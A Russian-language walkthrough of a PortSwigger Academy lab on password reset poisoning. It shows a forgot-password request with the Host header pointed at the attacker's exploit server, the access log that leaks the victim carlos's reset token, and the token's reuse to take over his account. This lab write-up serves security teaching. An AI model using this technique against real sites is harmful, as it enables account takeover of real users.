Перейдем на уязвимый ресурс, и пройдем процедуру восстановления пароля у УЗ `wiener`

Перейдем в `Exploit-server` ->` Email client` и увидим ссылку для восстановления пароля -
```
https://0ae20082039ba5588006e49b0063009f.web-security-academy.net/forgot-password?temp-forgot-password-token=brhg1vr56o5a81kwskqlndafm96tgb4l
```
Перейдем по ней введем новый пароль и его подтвердим

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/3.%20Basic%20password%20reset%20poisoning/pics%20for%20walkthrough/1.png)

Далее перейдем в `Proxy` -> `HTTP history` и найдем следующий запрос 
```
POST /forgot-password HTTP/2
...
csrf=NxV9aw3wRKP48AqH7wHLhYFtp4CtTOhD&username=wiener
```
и отправим его в `Repeater`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/3.%20Basic%20password%20reset%20poisoning/pics%20for%20walkthrough/2.png)

Заменим заголовок хоста на 
```
Host: example.com
```
и отправим запрос
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/3.%20Basic%20password%20reset%20poisoning/pics%20for%20walkthrough/3.png)

А  тем временем в `Email client` пришла новая ссылка на изменение пароля от аккаунта и заметим, что адресация идет на `example`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/3.%20Basic%20password%20reset%20poisoning/pics%20for%20walkthrough/4.png)

Далее Перейдем в `Exploit server` и возьмем его адрес, и вставим в `Host` адрес нашего Exploit-server'а


`exploit-0ae70086035ea5e58002e32501930009.exploit-server.net
`

и изменим юзера на карлоса
```
POST /forgot-password 
Host: exploit-0ae70086035ea5e58002e32501930009.exploit-server.net
csrf=NxV9aw3wRKP48AqH7wHLhYFtp4CtTOhD&username=carlos
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/3.%20Basic%20password%20reset%20poisoning/pics%20for%20walkthrough/5.png)

Далее перейдем в `Exploit server` -> `access logs`
и увидим там следующий лог
```
10.0.3.165      2024-06-21 12:29:24 +0000 "GET /forgot-password?temp-forgot-password-token=d8uks8p8nsl8sa8hqd56w9d4zwydc1rd HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```
по которому, мы можем узнать `temp-forgot-password-token=d8uks8p8nsl8sa8hqd56w9d4zwydc1rd`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/3.%20Basic%20password%20reset%20poisoning/pics%20for%20walkthrough/6.png)

Далее воспользуемся старой ссылкой 
```
https://0ae20082039ba5588006e49b0063009f.web-security-academy.net/forgot-password?temp-forgot-password-token=brhg1vr56o5a81kwskqlndafm96tgb4l
```
и изменим значение токена на токен `carlos`'а
```
https://0ae20082039ba5588006e49b0063009f.web-security-academy.net/forgot-password?temp-forgot-password-token=d8uks8p8nsl8sa8hqd56w9d4zwydc1rd
```

Вставляем данную ссылку в URL, придумываем новый пароль для карлоса

входим по новым придуманным кредам, и получаем уведомление об успешно выполненной лабораторной работе


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/3.%20Basic%20password%20reset%20poisoning/pics%20for%20walkthrough/7.png)
